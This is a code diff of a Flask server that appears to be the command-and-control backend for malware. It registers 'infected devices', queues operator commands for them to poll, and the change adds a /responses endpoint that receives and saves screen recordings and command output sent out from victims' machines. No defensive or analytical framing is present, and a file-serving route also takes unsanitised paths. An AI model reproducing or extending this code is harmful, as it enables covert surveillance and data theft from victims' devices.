@@ -1,11 +1,14 @@
-from flask import Flask, jsonify, send_file, request
+import os
 from flask_cors import CORS
+from flask import Flask, jsonify, send_file, request
 
 app = Flask(__name__)
 CORS(app, supports_credentials=True)
 
-infected_devices = []
+SCREEN_RECORDINGS_DIR = "screen_recordings"
+INFECTED_DEVICES = []
 messages = {}
+responses = {}
 
 @app.route("/")
 def home():
@@ -26,45 +29,71 @@ def commands():
     req = message.get('request', '')
 
     if 'ping' in req:
-      return jsonify({'status': 'pong'})
+      return jsonify({'status': 'pong'}), 200
     if 'new-device' in message:
-      device_name = message['new-device'].upper()
-      if device_name not in infected_devices:
-        infected_devices.append(device_name)
-        print('New device:', device_name)
-      return jsonify({'status': 'success'})
+      DEVICE_NAME = message['new-device'].upper()
+      if DEVICE_NAME not in INFECTED_DEVICES:
+        INFECTED_DEVICES.append(DEVICE_NAME)
+      return jsonify({'status': 'success'}), 200
     elif 'delete-all-devices' in req:
-      infected_devices.clear()
-      print('All devices deleted')
-      return jsonify({'status': 'success'})
+      INFECTED_DEVICES.clear()
+      return jsonify({'status': 'success'}), 200
     elif 'get-all-devices' in req:
-      return jsonify({'status': 'success', 'devices': infected_devices})
+      return jsonify({'status': 'success', 'devices': INFECTED_DEVICES}), 200
     elif 'remove-device' in req:
-      device_name = message['name'].upper()
-      if device_name in infected_devices:
-        infected_devices.remove(device_name)
-        print('Removed device:', device_name)
-      return jsonify({'status': 'success'})
+      DEVICE_NAME = message['name'].upper()
+      if DEVICE_NAME in INFECTED_DEVICES:
+        INFECTED_DEVICES.remove(DEVICE_NAME)
+      return jsonify({'status': 'success'}), 200
 
-    device = message['device'].upper()
-    if device in infected_devices:
-      messages.setdefault(device, []).append(message)
-      print(f"Queued message for {device}: {message}")
-      return jsonify({'status': 'success'})
+    DEVICE = message['device'].upper()
+    if DEVICE in INFECTED_DEVICES:
+      if DEVICE not in messages:
+        messages[DEVICE] = []
+      messages[DEVICE].append(message)
+      return jsonify({'status': 'success'}), 200
 
-    print(f"Device {device} not found. Message not queued.")
-    return jsonify({'status': 'error', 'message': f'device {device} not found.'}), 404
+    return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE}'}), 404
   elif request.method == 'GET':
-    device = request.args.get('device', '').upper()
-    if device in infected_devices:
-      out = messages.get(device, []).copy()
-      print(f'Message fetched for {device}: {out}')
-      messages.pop(device, None)
-      return jsonify(out)
+    DEVICE = request.args.get('device', '').upper()
+    if DEVICE in INFECTED_DEVICES:
+      out = messages.get(DEVICE, [])
+      messages.pop(DEVICE, None)
+      return jsonify(out), 200
     
-    print(f"Device {device} not found. No messages to fetch.")
-    return jsonify({'status': 'error', 'message': f'device {device} not found.'}), 404
-  
+    return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE}'}), 404
+
+@app.route("/responses", methods=["POST", "GET"])
+def responses_path():
+  DEVICE_NAME = request.args.get('device', '').upper()
+  if request.method == 'POST':
+    if request.files and request.form:
+      FILENAME = request.form.get('filename')
+      video = request.files['video']
+
+      if DEVICE_NAME in FILENAME and DEVICE_NAME in INFECTED_DEVICES:
+        video.save(os.path.join(SCREEN_RECORDINGS_DIR, FILENAME))
+        return jsonify({'status': 'success'}), 200
+
+      return jsonify({'status': 'fatal', 'message': 'video sent fron non-registered device.'}), 401
+    else:
+      data = request.get_json(force=True, silent=True) or {}
+      
+      if DEVICE_NAME in INFECTED_DEVICES:
+        if DEVICE_NAME not in responses:
+          responses[DEVICE_NAME] = []
+        responses[DEVICE_NAME].append(data)
+        return jsonify({'status': 'success'}), 200
+      
+      return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE_NAME}'}), 404
+  elif request.method == 'GET':
+    if DEVICE_NAME in INFECTED_DEVICES:
+      out = responses.get(DEVICE_NAME, [])
+      responses.pop(DEVICE_NAME, None)
+      return jsonify(out), 200
+
+    return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE_NAME}'}), 404
+
 @app.route("/resources/<path:filename>")
 def serve_resource(filename):
   return send_file(f"templates/{filename}")
